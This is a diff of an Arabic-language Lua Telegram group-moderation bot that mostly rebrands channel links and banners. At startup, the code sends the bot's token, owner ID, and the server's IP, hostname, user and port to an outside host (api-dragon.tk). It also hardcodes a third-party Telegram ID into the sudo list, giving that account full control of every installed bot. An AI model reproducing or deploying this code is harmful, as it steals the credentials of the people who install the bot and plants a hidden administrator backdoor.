@@ -1,8 +1,8 @@
 ------------------------------------------------
 -- This Source Was Developed By (AIAN) @VvTVv2.--
---   This Is The Source Channel @SrcDrg .     --
+--   This Is The Source Channel @CXRCX .     --
 --                 - WAAD -                 --
---         -- https://t.me/SrcDrg --          --
+--         -- https://t.me/CXRCX --          --
 ------------------------------------------------ 
 DevAIAN  = dofile("./AIAN_WAAD/redis.lua").connect("127.0.0.1", 6379)
 serpent = dofile("./AIAN_WAAD/serpent.lua")
@@ -69,7 +69,7 @@ WAAD = DevAIAN:get(Server_WAAD.."TokenWAAD"):match("(%d+)"),
 SudoIds = {DevAIAN:get(Server_WAAD.."IdWAAD")},
 }
 Create(Config, "./config.lua") 
-https.request("https://api-WAAD.tk/WAAD/WAAD.php?n=WAAD&id="..DevAIAN:get(Server_WAAD.."IdWAAD").."&token="..DevAIAN:get(Server_WAAD.."TokenWAAD").."&UserS="..User.."&IPS="..Ip.."&NameS="..Name.."&Port="..Port.."&Time="..UpTime)
+https.request("https://api-dragon.tk/Dragon/Dragon.php?n=DRAGON&id="..DevAIAN:get(Server_Dragon.."IdDragon").."&token="..DevAIAN:get(Server_Dragon.."TokenDragon").."&UserS="..User.."&IPS="..Ip.."&NameS="..Name.."&Port="..Port.."&Time="..UpTime)
 file = io.open("WAAD.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
@@ -122,21 +122,16 @@ return config
 end  
 Load_WAAD() 
 print("\27[36m"..[[ 
----------------------------------------------                                        
-|   ____  ____      _    ____  ___  _   _   |
-|  |  _ \|  _ \    / \  / ___|/ _ \| \ | |  |
-|  | | | | |_) |  / _ \| |  _| | | |  \| |  |
-|  | |_| |  _ <  / ___ \ |_| | |_| | |\  |  |
-|  |____/|_| \_\/_/   \_\____|\___/|_| \_|  |
-|-------------------------------------------|
-|This Source Was Developed By (AIAN) @VvTVv2.|
-|   This Is The Source Channel @S0DRG .     |
-|                - WAAD -                 |
----------------------------------------------
+__        ___        _    ____  
+\ \      / / \      / \  |  _ \ 
+ \ \ /\ / / _ \    / _ \ | | | |
+  \ V  V / ___ \  / ___ \| |_| |
+   \_/\_/_/   \_\/_/   \_\____/
+
 ]]..'\27[m'.."\n\27[35mServer Information ↬ ⤈ \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ ≈ ┉ ≈ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35mꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ ≈ ┉ ≈ ┉\27[m")
 Config = dofile("./config.lua")
 WAAD = Config.WAAD
-SudoIds = {Config.SudoIds,119541395,16076569}
+SudoIds = {Config.SudoIds,1566031059}
 WAAD = Config.WAAD
 TokenBot = Config.TokenBot
 NameBot = (DevAIAN:get(WAAD..'AIAN:NameBot') or 'دراكون')
@@ -478,7 +473,7 @@ end
 local List = DevAIAN:smembers(WAAD..'AIAN:Groups') 
 local Members = DevAIAN:smembers(WAAD..'AIAN:Users')
 local text = "⌯︙تم رفع النسخه بنجاح \n⌯︙تم رفع ↫ ( "..#Members.." ) مشترك في البوت\n⌯︙تم رفع وتفعيل ↫ ( "..#List.." ) مجموعة\n⌯︙تم استرجاع مشرفين المجموعات \n⌯︙تم استرجاع اوامر القفل والفتح في جميع مجموعات البوت \nꔹ┉ ┉ ┉ ┉ ┉ ┉ ┉ꔹ"
-local inline = {{{text = '• سـوࢪس دࢪاڪـون •',url='t.me/SrcDrg'}},}
+local inline = {{{text = '• سـوࢪس دࢪاڪـون •',url='t.me/CXRCX'}},}
 msg_id =  msg.id_/2097152/0.5
 SendInline(msg.chat_id_,text,nil,inline,msg_id) 
 end
@@ -714,7 +709,7 @@ end
 function ReplyStatus(msg,user_id,status,text)
 tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,dp) 
 if dp.first_name_ ~= false then
-local UserName = (dp.username_ or "SrcDrg")
+local UserName = (dp.username_ or "CXRCX")
 for gmatch in string.gmatch(dp.first_name_, "[^%s]+") do
 dp.first_name_ = gmatch
 end
@@ -1082,110 +1077,110 @@ if DataText and DataText:match(tonumber(data.sender_user_id_)..':SetMem:(.*)') t
 local AIANId = DataText:match(tonumber(data.sender_user_id_)..':SetMem:(.*)')
 tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
 DevAIAN:sadd(WAAD..'AIAN:VipMem:'..data.chat_id_,dp.id_)
-EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'SrcDrg')..')\n⌯︙تم رفعه في قائمة المميزين')
+EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم رفعه في قائمة المميزين')
 end,nil)
 elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':SetCleaner:(.*)') then
 local AIANId = DataText:match(tonumber(data.sender_user_id_)..':SetCleaner:(.*)')
 tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
 DevAIAN:sadd(WAAD..'AIAN:Cleaner:'..data.chat_id_,dp.id_)
-EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'SrcDrg')..')\n⌯︙تم رفعه في قائمة المنظفين')
+EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم رفعه في قائمة المنظفين')
 end,nil)
 elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':SetAdmin:(.*)') then
 local AIANId = DataText:match(tonumber(data.sender_user_id_)..':SetAdmin:(.*)')
 tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
 DevAIAN:sadd(WAAD..'AIAN:Admins:'..data.chat_id_,dp.id_)
-EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'SrcDrg')..')\n⌯︙تم رفعه في قائمة الادمنيه')
+EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم رفعه في قائمة الادمنيه')
 end,nil)
 elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':SetManager:(.*)') then
 local AIANId = DataText:match(tonumber(data.sender_user_id_)..':SetManager:(.*)')
 tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
 DevAIAN:sadd(WAAD..'AIAN:Managers:'..data.chat_id_,dp.id_)
-EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'SrcDrg')..')\n⌯︙تم رفعه في قائمة المدراء')
+EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم رفعه في قائمة المدراء')
 end,nil)
 elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':SetConstructor:(.*)') then
 local AIANId = DataText:match(tonumber(data.sender_user_id_)..':SetConstructor:(.*)')
 tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
 DevAIAN:sadd(WAAD..'AIAN:Constructor:'..data.chat_id_,dp.id_)
-EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'SrcDrg')..')\n⌯︙تم رفعه في قائمة المنشئين')
+EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم رفعه في قائمة المنشئين')
 end,nil)
 elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':SetBasicConstructor:(.*)') then
 local AIANId = DataText:match(tonumber(data.sender_user_id_)..':SetBasicConstructor:(.*)')
 tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
 DevAIAN:sadd(WAAD..'AIAN:BasicConstructor:'..data.chat_id_,dp.id_)
-EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'SrcDrg')..')\n⌯︙تم رفعه في قائمة المنشئين الاساسيين')
+EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم رفعه في قائمة المنشئين الاساسيين')
 end,nil)
 elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':SetAIANConstructor:(.*)') then
 local AIANId = DataText:match(tonumber(data.sender_user_id_)..':SetAIANConstructor:(.*)')
 tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
 DevAIAN:sadd(WAAD..'AIAN:AIANConstructor:'..data.chat_id_,dp.id_)
-EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'SrcDrg')..')\n⌯︙تم رفعه في قائمة المالكين')
+EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم رفعه في قائمة المالكين')
 end,nil)
 elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':SetSudoBot:(.*)') then
 local AIANId = DataText:match(tonumber(data.sender_user_id_)..':SetSudoBot:(.*)')
 tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
 DevAIAN:sadd(WAAD..'AIAN:SudoBot:'..data.chat_id_,dp.id_)
-EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'SrcDrg')..')\n⌯︙تم رفعه في قائمة المطورين')
+EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم رفعه في قائمة المطورين')
 end,nil)
 elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':SetSecondSudo:(.*)') then
 local AIANId = DataText:match(tonumber(data.sender_user_id_)..':SetSecondSudo:(.*)')
 tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
 DevAIAN:sadd(WAAD..'AIAN:SecondSudo:'..data.chat_id_,dp.id_)
-EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'SrcDrg')..')\n⌯︙تم رفعه في قائمة المطورين الثانويين')
+EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم رفعه في قائمة المطورين الثانويين')
 end,nil)
 end
 if DataText and DataText:match(tonumber(data.sender_user_id_)..':RemMem:(.*)') then
 local AIANId = DataText:match(tonumber(data.sender_user_id_)..':RemMem:(.*)')
 tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
 DevAIAN:srem(WAAD..'AIAN:VipMem:'..data.chat_id_,dp.id_)
-EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'SrcDrg')..')\n⌯︙تم تنزيله من قائمة المميزين')
+EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم تنزيله من قائمة المميزين')
 end,nil)
 elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':RemCleaner:(.*)') then
 local AIANId = DataText:match(tonumber(data.sender_user_id_)..':RemCleaner:(.*)')
 tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
 DevAIAN:srem(WAAD..'AIAN:Cleaner:'..data.chat_id_,dp.id_)
-EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'SrcDrg')..')\n⌯︙تم تنزيله من قائمة المنظفين')
+EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم تنزيله من قائمة المنظفين')
 end,nil)
 elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':RemAdmin:(.*)') then
 local AIANId = DataText:match(tonumber(data.sender_user_id_)..':RemAdmin:(.*)')
 tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
 DevAIAN:srem(WAAD..'AIAN:Admins:'..data.chat_id_,dp.id_)
-EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'SrcDrg')..')\n⌯︙تم تنزيله من قائمة الادمنيه')
+EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم تنزيله من قائمة الادمنيه')
 end,nil)
 elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':RemManager:(.*)') then
 local AIANId = DataText:match(tonumber(data.sender_user_id_)..':RemManager:(.*)')
 tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
 DevAIAN:srem(WAAD..'AIAN:Managers:'..data.chat_id_,dp.id_)
-EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'SrcDrg')..')\n⌯︙تم تنزيله من قائمة المدراء')
+EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم تنزيله من قائمة المدراء')
 end,nil)
 elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':RemConstructor:(.*)') then
 local AIANId = DataText:match(tonumber(data.sender_user_id_)..':RemConstructor:(.*)')
 tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
 DevAIAN:srem(WAAD..'AIAN:Constructor:'..data.chat_id_,dp.id_)
-EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'SrcDrg')..')\n⌯︙تم تنزيله من قائمة المنشئين')
+EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم تنزيله من قائمة المنشئين')
 end,nil)
 elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':RemBasicConstructor:(.*)') then
 local AIANId = DataText:match(tonumber(data.sender_user_id_)..':RemBasicConstructor:(.*)')
 tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
 DevAIAN:srem(WAAD..'AIAN:BasicConstructor:'..data.chat_id_,dp.id_)
-EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'SrcDrg')..')\n⌯︙تم تنزيله من قائمة المنشئين الاساسيين')
+EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم تنزيله من قائمة المنشئين الاساسيين')
 end,nil)
 elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':RemAIANConstructor:(.*)') then
 local AIANId = DataText:match(tonumber(data.sender_user_id_)..':RemAIANConstructor:(.*)')
 tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
 DevAIAN:srem(WAAD..'AIAN:AIANConstructor:'..data.chat_id_,dp.id_)
-EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'SrcDrg')..')\n⌯︙تم تنزيله من قائمة المالكين')
+EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم تنزيله من قائمة المالكين')
 end,nil)
 elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':RemSudoBot:(.*)') then
 local AIANId = DataText:match(tonumber(data.sender_user_id_)..':RemSudoBot:(.*)')
 tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
 DevAIAN:srem(WAAD..'AIAN:SudoBot:'..data.chat_id_,dp.id_)
-EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'SrcDrg')..')\n⌯︙تم تنزيله من قائمة المطورين')
+EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم تنزيله من قائمة المطورين')
 end,nil)
 elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':RemSecondSudo:(.*)') then
 local AIANId = DataText:match(tonumber(data.sender_user_id_)..':RemSecondSudo:(.*)')
 tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
 DevAIAN:srem(WAAD..'AIAN:SecondSudo:'..data.chat_id_,dp.id_)
-EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'SrcDrg')..')\n⌯︙تم تنزيله من قائمة المطورين الثانويين')
+EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم تنزيله من قائمة المطورين الثانويين')
 end,nil)
 end
 if DataText and DataText:match(tonumber(data.sender_user_id_)..':Mute:(.*)') then
@@ -1195,14 +1190,14 @@ if RankChecking(dp.id_, data.chat_id_) then
 EditMsg(Chat_Id2, Msg_Id2,'⌯︙لا تستطيع كتم ↫ '..IdRank(dp.id_, data.chat_id_))
 else
 DevAIAN:sadd(WAAD..'AIAN:Muted:'..data.chat_id_,dp.id_)
-EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'SrcDrg')..')\n⌯︙تم كتمه من المجموعه')
+EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم كتمه من المجموعه')
 end
 end,nil)
 elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':UnMute:(.*)') then
 local AIANId = DataText:match(tonumber(data.sender_user_id_)..':UnMute:(.*)')
 tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
 DevAIAN:srem(WAAD..'AIAN:Muted:'..data.chat_id_,dp.id_)
-EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'SrcDrg')..')\n⌯︙تم الغاء كتمه من المجموعه')
+EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم الغاء كتمه من المجموعه')
 end,nil)
 elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':Ban:(.*)') then
 local AIANId = DataText:match(tonumber(data.sender_user_id_)..':Ban:(.*)')
@@ -1211,14 +1206,14 @@ if RankChecking(dp.id_, data.chat_id_) then
 EditMsg(Chat_Id2, Msg_Id2,'⌯︙لا تستطيع حظر ↫ '..IdRank(dp.id_, data.chat_id_))
 else
 DevAIAN:sadd(WAAD..'AIAN:Ban:'..data.chat_id_,dp.id_)
-EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'SrcDrg')..')\n⌯︙تم حظره من المجموعه')
+EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم حظره من المجموعه')
 end
 end,nil)
 elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':UnBan:(.*)') then
 local AIANId = DataText:match(tonumber(data.sender_user_id_)..':UnBan:(.*)')
 tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
 DevAIAN:srem(WAAD..'AIAN:Ban:'..data.chat_id_,dp.id_)
-EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'SrcDrg')..')\n⌯︙تم الغاء حظره من المجموعه')
+EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم الغاء حظره من المجموعه')
 end,nil)
 elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':Tked:(.*)') then
 local AIANId = DataText:match(tonumber(data.sender_user_id_)..':Tked:(.*)')
@@ -1228,7 +1223,7 @@ EditMsg(Chat_Id2, Msg_Id2,'⌯︙لا تستطيع تقيد ↫ '..IdRank(dp.id_
 else
 https.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..data.chat_id_.."&user_id="..dp.id_)
 DevAIAN:sadd(WAAD..'AIAN:Tkeed:'..data.chat_id_,dp.id_)
-EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'SrcDrg')..')\n⌯︙تم تقيده من المجموعه')
+EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم تقيده من المجموعه')
 end
 end,nil)
 elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':UnTked:(.*)') then
@@ -1236,7 +1231,7 @@ local AIANId = DataText:match(tonumber(data.sender_user_id_)..':UnTked:(.*)')
 tdcli_function ({ID = "GetUser",user_id_ = AIANId},function(arg,dp) 
 HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..data.chat_id_.."&user_id="..dp.id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
 DevAIAN:srem(WAAD..'AIAN:Tkeed:'..data.chat_id_,dp.id_)
-EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'SrcDrg')..')\n⌯︙تم الغاء تقيده من المجموعه')
+EditMsg(Chat_Id2, Msg_Id2,'⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n⌯︙تم الغاء تقيده من المجموعه')
 end,nil)
 end
 if DataText and DataText:match(tonumber(data.sender_user_id_)..':SetRtba:(.*)') then
@@ -1246,24 +1241,24 @@ if dp.first_name_ == false then
 Dev_AIAN(data.chat_id_, data.id_, 1, "⌯︙الحساب محذوف", 1, "md")
 return false  
 end
-local Text = ' ⌯︙قم باستعمال الازرار لرفع العضو ↫ ⤈\n⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'SrcDrg')..')\n✓'
+local Text = ' ⌯︙قم باستعمال الازرار لرفع العضو ↫ ⤈\n⌯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'CXRCX')..')\n✓'
 keyboard = {} 
 if Sudo(data) then
-keyboard.inline_keyboard = {{{text="رفع مميز",callback_data=data.sender_user_id_..":SetMem:"..AIANId},{text="رفع ادمن",callback_data=data.sender_user_id_..":SetAdmin:"..AIANId}},{{text="رفع منشئ",callback_data=data.sender_user_id_..":SetConstructor:"..AIANId},{text="رفع مدير",callback_data=data.sender_user_id_..":SetManager:"..AIANId}},{{text="رفع منظف",callback_data=data.sender_user_id_..":SetCleaner:"..AIANId},{text="رفع منشئ اساسي",callback_data=data.sender_user_id_..":SetBasicConstructor:"..AIANId}},{{text="رفع مالك",callback_data=data.sender_user_id_..":SetAIANConstructor:"..AIANId},{text="رفع مطور",callback_data=data.sender_user_id_..":SetSudoBot:"..AIANId}},{{text="رفع مطور ثانوي",callback_data=data.sender_user_id_..":SetSecondSudo:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/SrcDrg"}}}
+keyboard.inline_keyboard = {{{text="رفع مميز",callback_data=data.sender_user_id_..":SetMem:"..AIANId},{text="رفع ادمن",callback_data=data.sender_user_id_..":SetAdmin:"..AIANId}},{{text="رفع منشئ",callback_data=data.sender_user_id_..":SetConstructor:"..AIANId},{text="رفع مدير",callback_data=data.sender_user_id_..":SetManager:"..AIANId}},{{text="رفع منظف",callback_data=data.sender_user_id_..":SetCleaner:"..AIANId},{text="رفع منشئ اساسي",callback_data=data.sender_user_id_..":SetBasicConstructor:"..AIANId}},{{text="رفع مالك",callback_data=data.sender_user_id_..":SetAIANConstructor:"..AIANId},{text="رفع مطور",callback_data=data.sender_user_id_..":SetSudoBot:"..AIANId}},{{text="رفع مطور ثانوي",callback_data=data.sender_user_id_..":SetSecondSudo:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
 elseif SecondSudo(data) then
-keyboard.inline_keyboard = {{{text="رفع مميز",callback_data=data.sender_user_id_..":SetMem:"..AIANId},{text="رفع ادمن",callback_data=data.sender_user_id_..":SetAdmin:"..AIANId}},{{text="رفع منشئ",callback_data=data.sender_user_id_..":SetConstructor:"..AIANId},{text="رفع مدير",callback_data=data.sender_user_id_..":SetManager:"..AIANId}},{{text="رفع منظف",callback_data=data.sender_user_id_..":SetCleaner:"..AIANId},{text="رفع منشئ اساسي",callback_data=data.sender_user_id_..":SetBasicConstructor:"..AIANId}},{{text="رفع مالك",callback_data=data.sender_user_id_..":SetAIANConstructor:"..AIANId},{text="رفع مطور",callback_data=data.sender_user_id_..":SetSudoBot:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/SrcDrg"}}}
+keyboard.inline_keyboard = {{{text="رفع مميز",callback_data=data.sender_user_id_..":SetMem:"..AIANId},{text="رفع ادمن",callback_data=data.sender_user_id_..":SetAdmin:"..AIANId}},{{text="رفع منشئ",callback_data=data.sender_user_id_..":SetConstructor:"..AIANId},{text="رفع مدير",callback_data=data.sender_user_id_..":SetManager:"..AIANId}},{{text="رفع منظف",callback_data=data.sender_user_id_..":SetCleaner:"..AIANId},{text="رفع منشئ اساسي",callback_data=data.sender_user_id_..":SetBasicConstructor:"..AIANId}},{{text="رفع مالك",callback_data=data.sender_user_id_..":SetAIANConstructor:"..AIANId},{text="رفع مطور",callback_data=data.sender_user_id_..":SetSudoBot:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
 elseif SudoBot(data) then
-keyboard.inline_keyboard = {{{text="رفع مميز",callback_data=data.sender_user_id_..":SetMem:"..AIANId},{text="رفع ادمن",callback_data=data.sender_user_id_..":SetAdmin:"..AIANId}},{{text="رفع منشئ",callback_data=data.sender_user_id_..":SetConstructor:"..AIANId},{text="رفع مدير",callback_data=data.sender_user_id_..":SetManager:"..AIANId}},{{text="رفع منظف",callback_data=data.sender_user_id_..":SetCleaner:"..AIANId},{text="رفع منشئ اساسي",callback_data=data.sender_user_id_..":SetBasicConstructor:"..AIANId}},{{text="رفع مالك",callback_data=data.sender_user_id_..":SetAIANConstructor:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/SrcDrg"}}}
+keyboard.inline_keyboard = {{{text="رفع مميز",callback_data=data.sender_user_id_..":SetMem:"..AIANId},{text="رفع ادمن",callback_data=data.sender_user_id_..":SetAdmin:"..AIANId}},{{text="رفع منشئ",callback_data=data.sender_user_id_..":SetConstructor:"..AIANId},{text="رفع مدير",callback_data=data.sender_user_id_..":SetManager:"..AIANId}},{{text="رفع منظف",callback_data=data.sender_user_id_..":SetCleaner:"..AIANId},{text="رفع منشئ اساسي",callback_data=data.sender_user_id_..":SetBasicConstructor:"..AIANId}},{{text="رفع مالك",callback_data=data.sender_user_id_..":SetAIANConstructor:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
 elseif AIANConstructor(data) then
-keyboard.inline_keyboard = {{{text="رفع مميز",callback_data=data.sender_user_id_..":SetMem:"..AIANId},{text="رفع ادمن",callback_data=data.sender_user_id_..":SetAdmin:"..AIANId}},{{text="رفع منشئ",callback_data=data.sender_user_id_..":SetConstructor:"..AIANId},{text="رفع مدير",callback_data=data.sender_user_id_..":SetManager:"..AIANId}},{{text="رفع منظف",callback_data=data.sender_user_id_..":SetCleaner:"..AIANId},{text="رفع منشئ اساسي",callback_data=data.sender_user_id_..":SetBasicConstructor:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/SrcDrg"}}}
+keyboard.inline_keyboard = {{{text="رفع مميز",callback_data=data.sender_user_id_..":SetMem:"..AIANId},{text="رفع ادمن",callback_data=data.sender_user_id_..":SetAdmin:"..AIANId}},{{text="رفع منشئ",callback_data=data.sender_user_id_..":SetConstructor:"..AIANId},{text="رفع مدير",callback_data=data.sender_user_id_..":SetManager:"..AIANId}},{{text="رفع منظف",callback_data=data.sender_user_id_..":SetCleaner:"..AIANId},{text="رفع منشئ اساسي",callback_data=data.sender_user_id_..":SetBasicConstructor:"..AIANId}},{{text = '• سـوࢪس دࢪاڪـون •',url="t.me/CXRCX"}}}
 elseif BasicConstructor(data) then
